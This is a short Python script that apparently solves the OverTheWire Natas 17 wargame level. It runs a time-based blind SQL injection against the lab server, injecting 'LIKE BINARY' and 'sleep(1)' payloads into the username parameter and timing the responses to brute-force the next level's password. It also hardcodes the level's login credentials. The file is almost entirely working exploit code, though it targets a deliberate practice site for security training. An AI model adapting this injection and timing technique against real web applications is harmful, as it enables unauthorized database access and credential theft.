#!/bin/python
import requests,string
import sys

url = "http://natas17.natas.labs.overthewire.org"
auth_username = "natas17"
auth_password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

# characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
characters = string.ascii_letters+string.digits

# Begin by building a dictionary of characters found in the password
password_dictionary = []

for char in characters:
    uri = url+'?'+'username=natas18"'+'+AND+password+LIKE+BINARY+%27%25'+char+'%25%27+AND+sleep(1)+--+'
    r = requests.get(uri, auth=(auth_username,auth_password))
    sys.stdout.write("[+] Password Dictionary: {0}_ {1} \r".format(''.join(password_dictionary),char))
    sys.stdout.flush()
    if r.elapsed.total_seconds()>=1:
        password_dictionary.append(char)

print("Dictionary build complete.")
print("Dictionary: {0}".format(''.join(password_dictionary)))


# Given the dictionary of characters we just built, we'll try each character in that list
print("[+] Now attempting to brute force...")
password_list = []
password = ''
for i in range(1,32):
    for char in password_dictionary:
        uri = url+'?'+'username=natas18"'+'+AND+password+LIKE+BINARY+%27'+password+char+'%25%27+AND+sleep(1)+--+'
        r = requests.get(uri, auth=(auth_username,auth_password))
        sys.stdout.write("Length: {0}, Password: {1}{2} \r".format(len(password),password,char))
        sys.stdout.flush()
        if r.elapsed.total_seconds()>=1:
            password_list.append(char)
            password = ''.join(password_list)
            break
print(password)